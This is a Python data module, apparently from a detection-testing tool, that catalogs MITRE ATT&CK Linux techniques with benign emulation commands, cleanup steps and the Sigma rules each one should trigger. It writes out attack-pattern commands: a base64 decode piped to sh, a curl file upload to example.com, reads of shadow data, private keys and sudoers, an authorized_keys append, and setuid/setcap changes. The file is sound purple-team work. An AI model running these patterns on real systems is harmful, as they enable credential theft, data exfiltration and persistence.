"""The technique catalog as data — the single source both ``catalog.py`` (metadata)
and ``registry.py`` (executable specs) build from.

Every ``detected`` technique is backed by a real shipped detection rule (``rule_file``):
a verbatim-vendored SigmaHQ ``linux/process_creation`` rule where one exists (23 under
``rules/sigmahq/`` plus the setuid rule at ``rules/proc_creation_lnx_setgid_setuid.yml``),
or a RedGap-authored rule (``rules/redgap/``) for the original kill-chain. Its benign
command is crafted to trigger that rule. ``gap`` techniques ship no rule (a rule gap) or
are deliberately too common to alert on with a single event (a base-rate gap). Nothing
here declares a verdict — ``expected`` only says what was VERIFIED to be produced (so a
regression is flagged) and, for gaps, which *kind* of gap to label; the detection engine
computes the actual detected/gap outcome from captured telemetry + rules.

Every command is benign and runs inside the disposable, network-less, no-new-privileges,
auto-destroyed lab container. ATT&CK ids/names verified against attack.mitre.org.
"""

from __future__ import annotations

from dataclasses import dataclass

from redgap.models import GapType

NONE = GapType.NONE
RULE = GapType.RULE
BASE_RATE = GapType.BASE_RATE


@dataclass(frozen=True)
class TechDef:
    """One catalog technique: metadata + the benign commands that emit its artifact."""

    id: str
    name: str
    tactics: tuple[str, ...]
    description: str
    commands: tuple[str, ...]
    cleanup: tuple[str, ...] = ()
    expected: GapType = NONE
    #: The SigmaHQ corpus rule vendored to detect this technique (provenance), or "".
    rule_file: str = ""


TECHNIQUES: tuple[TechDef, ...] = (
    # ---- The original v0.1 kill-chain (detected / rule-gap / base-rate) ----
    TechDef(
        "T1087.001",
        "Account Discovery: Local Account",
        ("Discovery",),
        "Enumerate local accounts by reading /etc/passwd.",
        ("cat /etc/passwd",),
        (),
        NONE,
        "rules/redgap/account_discovery_etc_passwd.yml",
    ),
    TechDef(
        "T1057",
        "Process Discovery",
        ("Discovery",),
        "List running processes with ps.",
        ("ps aux",),
        (),
        BASE_RATE,
    ),
    TechDef(
        "T1136.001",
        "Create Account: Local Account",
        ("Persistence",),
        "Create a local nologin, no-password account with useradd.",
        ("useradd -M -N -s /usr/sbin/nologin svc_demo",),
        ("userdel svc_demo",),
        NONE,
        "rules/redgap/create_account_useradd.yml",
    ),
    TechDef(
        "T1548.001",
        "Abuse Elevation Control Mechanism: Setuid and Setgid",
        ("Privilege Escalation", "Defense Evasion"),
        "Set the setuid bit on an inert /bin/true copy after chown root.",
        (
            "cp /bin/true /tmp/redgap_demo_suid",
            "sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'",
        ),
        ("rm -f /tmp/redgap_demo_suid",),
        NONE,
        "rules/proc_creation_lnx_setgid_setuid.yml",
    ),
    TechDef(
        "T1070.006",
        "Indicator Removal: Timestomp",
        ("Defense Evasion",),
        "Copy a reference file's timestamps onto another (timestomp).",
        ("touch -r /etc/hostname /tmp/redgap_agent_file",),
        ("rm -f /tmp/redgap_agent_file",),
        RULE,
    ),
    # ---- Discovery ----
    TechDef(
        "T1082",
        "System Information Discovery",
        ("Discovery",),
        "Read the kernel/OS banner with uname.",
        ("uname -a",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_system_info_discovery.yml",
    ),
    TechDef(
        "T1016",
        "System Network Configuration Discovery",
        ("Discovery",),
        "Read the resolver configuration.",
        ("cat /etc/resolv.conf",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_system_network_discovery.yml",
    ),
    TechDef(
        "T1069.001",
        "Permission Groups Discovery: Local Groups",
        ("Discovery",),
        "Print the current user's group memberships.",
        ("groups",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_local_groups.yml",
    ),
    TechDef(
        "T1518.001",
        "Software Discovery: Security Software Discovery",
        ("Discovery",),
        "Look for a security agent (grep for a Falcon daemon string).",
        ("grep falcond /etc/passwd || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_security_software_discovery.yml",
    ),
    TechDef(
        "T1083",
        "File and Directory Discovery",
        ("Discovery",),
        "Search the filesystem for a file by name with find.",
        ("find /etc -name hosts",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_file_and_directory_discovery.yml",
    ),
    TechDef(
        "T1033",
        "System Owner/User Discovery",
        ("Discovery",),
        "Print the effective username with whoami (base-rate: ubiquitous).",
        ("whoami",),
        ("true",),
        BASE_RATE,
    ),
    TechDef(
        "T1518",
        "Software Discovery",
        ("Discovery",),
        "List installed packages with dpkg (rule gap: no list-action rule ships).",
        ("dpkg -l || true",),
        ("true",),
        RULE,
    ),
    # ---- Defense Evasion ----
    TechDef(
        "T1140",
        "Deobfuscate/Decode Files or Information",
        ("Defense Evasion",),
        "Decode a base64 string and pipe it to a shell (payload decodes to 'ls').",
        ("echo bHM= | base64 -d | sh",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_base64_execution.yml",
    ),
    TechDef(
        "T1222.002",
        "Linux and Mac File and Directory Permissions Modification",
        ("Defense Evasion",),
        "Clear the immutable attribute on a throwaway file with chattr -i.",
        ("touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true",),
        ("rm -f /tmp/redgap_imm",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_chattr_immutable_removal.yml",
    ),
    TechDef(
        "T1070.004",
        "Indicator Removal: File Deletion",
        ("Defense Evasion",),
        "Securely delete a throwaway file with shred.",
        ("touch /tmp/redgap_shred && shred -u /tmp/redgap_shred",),
        ("rm -f /tmp/redgap_shred",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_file_deletion.yml",
    ),
    TechDef(
        "T1497.001",
        "Virtualization/Sandbox Evasion: System Checks",
        ("Defense Evasion",),
        "Read a DMI product-name pseudo-file to fingerprint the host (rule gap).",
        ("cat /sys/class/dmi/id/product_name 2>/dev/null || true",),
        ("true",),
        RULE,
    ),
    # ---- Execution ----
    TechDef(
        "T1059",
        "Command and Scripting Interpreter",
        ("Execution",),
        "Spawn a shell from awk (the spawned shell only runs 'id').",
        ("awk 'BEGIN {system(\"/bin/sh -c id\")}'",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_awk_shell_spawn.yml",
    ),
    TechDef(
        "T1059.004",
        "Command and Scripting Interpreter: Unix Shell",
        ("Execution",),
        "Invoke a shell via env (runs 'id').",
        ("env /bin/sh -c id",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_env_shell_invocation.yml",
    ),
    TechDef(
        "T1059.006",
        "Command and Scripting Interpreter: Python",
        ("Execution",),
        "Run an inline python one-liner (base-rate: ubiquitous in ops/CI).",
        ("""command -v python3 >/dev/null 2>&1 && python3 -c "print('redgap')" || true""",),
        ("true",),
        BASE_RATE,
    ),
    # ---- Persistence / Privilege Escalation ----
    TechDef(
        "T1053.003",
        "Scheduled Task/Job: Cron",
        ("Execution", "Persistence", "Privilege Escalation"),
        "Install a benign crontab (its only job runs /bin/true), then remove it.",
        (r"printf '* * * * * /bin/true\n' > /tmp/rgcron && crontab /tmp/rgcron || true",),
        ("crontab -r 2>/dev/null; rm -f /tmp/rgcron; true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_schedule_task_job_cron.yml",
    ),
    TechDef(
        "T1053.002",
        "Scheduled Task/Job: At",
        ("Privilege Escalation", "Execution", "Persistence"),
        "Queue a benign 'at' job (/bin/true), then dequeue it.",
        ("echo /bin/true | at now + 1 hour || true",),
        ("atq | cut -f1 | xargs -r atrm; true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_at_command.yml",
    ),
    TechDef(
        "T1548",
        "Abuse Elevation Control Mechanism",
        ("Privilege Escalation", "Persistence"),
        "Set the setuid capability on an inert /bin/true copy with setcap, then strip it.",
        ("cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true",),
        ("setcap -r /tmp/rgcap 2>/dev/null; rm -f /tmp/rgcap; true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_cap_setuid.yml",
    ),
    TechDef(
        "T1546.004",
        "Event Triggered Execution: Unix Shell Configuration Modification",
        ("Persistence", "Privilege Escalation"),
        "Append a comment line to root's .bashrc, then restore it (base-rate gap).",
        (
            r"cp -n /root/.bashrc /root/.bashrc.rgbak; "
            r"printf '# redgap-benign-test\n' | tee -a /root/.bashrc >/dev/null || true",
        ),
        ("mv -f /root/.bashrc.rgbak /root/.bashrc 2>/dev/null; true",),
        BASE_RATE,
    ),
    TechDef(
        "T1098.004",
        "Account Manipulation: SSH Authorized Keys",
        ("Persistence",),
        "Append a placeholder key to authorized_keys, then remove it (rule gap).",
        (
            r"mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\n' "
            r"| tee -a /root/.ssh/authorized_keys >/dev/null || true",
        ),
        (
            "sed -i '/redgap-benign-test/d' /root/.ssh/authorized_keys 2>/dev/null; "
            "rmdir --ignore-fail-on-non-empty /root/.ssh 2>/dev/null; true",
        ),
        RULE,
    ),
    # ---- Credential Access ----
    TechDef(
        "T1552.001",
        "Unsecured Credentials: Credentials In Files",
        ("Credential Access",),
        "Copy a throwaway file named /tmp/shadow (never the real one).",
        ("touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak",),
        ("rm -f /tmp/shadow /tmp/shadow.bak",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml",
    ),
    TechDef(
        "T1003.008",
        "OS Credential Dumping: /etc/passwd and /etc/shadow",
        ("Credential Access",),
        "Query the local shadow database with getent (rule gap).",
        ("getent shadow || true",),
        ("true",),
        RULE,
    ),
    TechDef(
        "T1552.004",
        "Unsecured Credentials: Private Keys",
        ("Credential Access",),
        "Attempt to read a private key path (rule gap).",
        ("cat /root/.ssh/id_rsa 2>/dev/null || true",),
        ("true",),
        RULE,
    ),
    # ---- Collection ----
    TechDef(
        "T1560.001",
        "Archive Collected Data: Archive via Utility",
        ("Collection",),
        "Archive two public files with tar (rule gap).",
        ("tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true",),
        ("rm -f /tmp/rg_loot.tgz",),
        RULE,
    ),
    TechDef(
        "T1005",
        "Data from Local System",
        ("Collection",),
        "Read a world-readable local file (base-rate: too common to alert on).",
        ("cat /etc/hostname || true",),
        ("true",),
        BASE_RATE,
    ),
    # ---- Command and Control / Exfiltration ----
    TechDef(
        "T1071.001",
        "Application Layer Protocol: Web Protocols",
        ("Command and Control",),
        "Make a web request with a custom curl User-Agent (offline; call fails harmlessly).",
        ("curl -A 'RedGap/1.0' http://example.com/ || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_susp_curl_useragent.yml",
    ),
    TechDef(
        "T1090",
        "Proxy",
        ("Command and Control",),
        "Set a loopback proxy env var and run /bin/true.",
        ("env http_proxy=http://127.0.0.1:3128 true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_proxy_connection.yml",
    ),
    TechDef(
        "T1567",
        "Exfiltration Over Web Service",
        ("Exfiltration", "Command and Control"),
        "Upload a public file with curl --upload-file (offline; call fails harmlessly).",
        ("curl --upload-file /etc/hostname http://example.com/ || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_susp_curl_fileupload.yml",
    ),
    TechDef(
        "T1048.003",
        "Exfiltration Over Unencrypted Non-C2 Protocol",
        ("Exfiltration",),
        "Start the stdlib HTTP server for 3s (offline; unreachable), then it is killed.",
        ("timeout 3 python3 -m http.server 8000 || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_python_http_server_execution.yml",
    ),
    # ---- Impact ----
    TechDef(
        "T1485",
        "Data Destruction",
        ("Impact",),
        "Overwrite a throwaway /tmp file with dd (1 KB of zeros).",
        ("dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",),
        ("rm -f /tmp/redgap_wipe",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_dd_file_overwrite.yml",
    ),
    TechDef(
        "T1489",
        "Service Stop",
        ("Impact",),
        "Attempt to stop a non-existent service with systemctl.",
        ("systemctl stop redgap-nonexistent.service || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_services_stop_and_disable.yml",
    ),
    TechDef(
        "T1653",
        "Power Settings",
        ("Persistence", "Impact"),
        "Mask then unmask a systemd power target.",
        ("systemctl mask hibernate.target || true",),
        ("systemctl unmask hibernate.target 2>/dev/null; true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_systemctl_mask_power_settings.yml",
    ),
    TechDef(
        "T1565.001",
        "Data Manipulation: Stored Data Manipulation",
        ("Impact",),
        "Read (not modify) a sensitive config file with sed.",
        ("sed -n '1p' /etc/hosts || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_susp_sensitive_file_access.yml",
    ),
    # ---- Reconnaissance ----
    TechDef(
        "T1592.004",
        "Gather Victim Host Information: Client Configurations",
        ("Reconnaissance",),
        "Read the sudoers file content.",
        ("grep root /etc/sudoers || true",),
        ("true",),
        NONE,
        "rules/sigmahq/proc_creation_lnx_susp_process_reading_sudoers.yml",
    ),
)
